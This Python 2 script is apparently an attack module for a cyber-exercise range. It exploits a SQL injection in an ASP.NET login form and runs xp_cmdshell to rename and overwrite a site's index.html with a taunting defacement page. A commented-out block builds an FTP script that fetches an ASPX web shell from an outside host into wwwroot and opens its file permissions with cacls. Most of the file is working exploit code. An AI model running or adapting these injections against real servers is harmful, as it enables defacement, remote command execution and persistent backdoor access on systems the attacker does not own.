import sys
import getopt
import httplib
import urllib
import time

PC = """
<html>
You've been pwn3d by the KAR-IANs. HOW DOES IT FEEL?!
</html>
"""

regular = """
<html>
Pwn3d!
</html>
"""


class web_deface():
    def __init__(self):
        self.name = "SQL Injection"
        self.description = "An inject to exploit a pre-planted SQL vulnerability to deface a web site"
        self.variables = {'src_ip':'', 'replacement_html_AREA':'', 'replacement_html_OPTION':[PC,regular]}
        self.canSave = True
        self.domain = "www.uct.jcor"

    def range(self, **kwargs):
        ip = kwargs['src_ip']
        port = 0
        target = self.domain

        deface = ''
        if 'replacement_html' in kwargs:
            deface = kwargs['replacement_html_AREA']
        else:
            deface = kwargs['replacement_html_OPTION']

        deface = deface.replace('^','^^')
        deface = deface.replace('<','^<')
        deface = deface.replace('>','^>')
        deface = deface.replace('\'','\'\'')
        deface = deface.replace('\n','')
        deface = deface.replace('\t','')
        deface = deface.replace('&','^&')
        deface = deface.replace('|','^|')
        print("Defacing with:\n{}".format(deface))
        backdoorCMD = []
        backdoorCMD.append("blah\'; exec master..xp_cmdshell \"ren C:\\inetpub\\wwwroot\\index.html "+str(time.time())+"backup.html\" --")
        #Create a new index.html
        backdoorCMD.append("blah\'; exec master..xp_cmdshell \'CMD /S /C \"echo " + deface + " > C:\\inetpub\\wwwroot\\index.html\"\' --")

        print("\n\nCommand:\n{}\n\n".format(backdoorCMD))
        headers = {"Connection": "Keep-Alive","User-Agent": "Mozilla/5.0 (compatible; Konqueror/4.5; Linux) KHTML/4.5.3 (like Gecko) Kubuntu", "Referer": "http://" + target +"/Login.aspx",
       "Pragma": "no-cache", "Cache-control": "no-cache", "Accept": "text/html, image/jpeg;q=0.9, image/png;q=0.9, text/*;q=0.9, image/*;q=0.9, */*;q=0.8",
       "Accept-Encoding": "x-gzip, x-deflate, gzip, deflate", "Accept-Charset": "utf-8, utf-8;q=0.5, *;q=0.5", "Accept-Language": "en-US,en;q=0.9", "Content-Type": "application/x-www-form-urlencoded"}

        try:
            # Get robots.txt
            conn = httplib.HTTPConnection(target, source_address=(ip, port))
            conn.request("GET","/robots.txt")
            response = conn.getresponse()
            body = response.read()
            # Get login.aspx
            conn = httplib.HTTPConnection(target, source_address=(ip, port))
            conn.request("GET","/Login.aspx")
            response = conn.getresponse()
            body = response.read()

            # SQL inject it
            viewstate = body
            viewstate = viewstate[viewstate.find("id=\"__VIEWSTATE\"") + len("id=\"__VIEWSTATE\"") +1 : viewstate.find("id=\"__VIEWSTATE\"") + 80] # Magic number obtained by reading web page source
            viewstate = viewstate[viewstate.find("value=\"") + len("value=\""): len(viewstate)]
            viewstate = viewstate[0: viewstate.find("\"")]
            eventvalidation = body
            eventvalidation = eventvalidation[eventvalidation.find("id=\"__EVENTVALIDATION\"") + len("id=\"__EVENTVALIDATION\"") + 1: eventvalidation.find("id=\"__EVENTVALIDATION\"") + 100] #Magic number obtained by reading web page source
            eventvalidation = eventvalidation[eventvalidation.find("value=\"") + len("value=\""): len(eventvalidation)]
            eventvalidation = eventvalidation[0: eventvalidation.find("\"")]

            part = 0
            #Run Injects Sequentially
            for cmd in backdoorCMD:
                params = urllib.urlencode((('__VIEWSTATE',viewstate),( '__EVENTVALIDATION',eventvalidation),('UsernameTextBox',cmd),('PasswordTextBox',''),('LoginButton','Login')),True)
                conn.request("POST", "/Login.aspx", params, headers)
                response = conn.getresponse()
                body = response.read()

                part = part + 1

                #Response Value
                if response.status == 200:
                    print '[*] Inject Part: ' + str(part) + ' Successful!'
                else:
                    print '[*] Inject Part: ' + str(part) + ' Unsuccessful, Error Code: ' + str(response.status)

        except Exception as e:
            print "Oops! Something went wrong, is the target webserver up? Error: {}".format(str(e))

    def run(self, **kwargs):
        self.range(**kwargs)

    ''' FTP UPLOAD SCRIPT INJECT
    backdoorCMD = []
    backdoorCMD.append("blah\'; exec master..xp_cmdshell \"echo Open ftp.gnu.org > C:\\inetpub\\wwwroot\\ftp.txt\" --")
    backdoorCMD.append("blah\'; exec master..xp_cmdshell \"echo anonymous>> C:\\inetpub\\wwwroot\\ftp.txt\" --")
    backdoorCMD.append("blah\'; exec master..xp_cmdshell \"echo anonymous>> C:\\inetpub\\wwwroot\\ftp.txt\" --")
    backdoorCMD.append("blah\'; exec master..xp_cmdshell \"echo GET cmdasp.aspx C:\\inetpub\\wwwroot\\backup.aspx >> C:\\inetpub\\wwwroot\\ftp.txt\" --")
    backdoorCMD.append("blah\'; exec master..xp_cmdshell \"echo GET Simon.png c:\\inetpub\\wwwroot\\Simon.png >> C:\\inetpub\\wwwroot\\ftp.txt\" --")
    backdoorCMD.append("blah\'; exec master..xp_cmdshell \"echo GET index.html C:\\inetpub\\wwwroot\\index.html >>c:\\inetpub\\wwwroot\\ftp.txt\" --")
    backdoorCMD.append("blah\'; exec master..xp_cmdshell \"echo bye >> C:\\inetpub\\wwwroot\\ftp.txt\" --")
    backdoorCMD.append("blah\'; exec master..xp_cmdshell \"FTP -s:C:\\inetpub\\wwwroot\\ftp.txt\" --")
    backdoorCMD.append("blah\'; exec master..xp_cmdshell \"cacls C:\\inetpub\\wwwroot\\backup.aspx /E /G Users:F\" --")
    backdoorCMD.append("blah\'; exec master..xp_cmdshell \"cacls C:\\inetpub\\wwwroot\\Simon.png /E /G Users:F\" --")
    backdoorCMD.append("blah\'; exec master..xp_cmdshell \"cacls C:\\inetpub\\wwwroot\\index.html /E /G Users:F\" --")
    '''

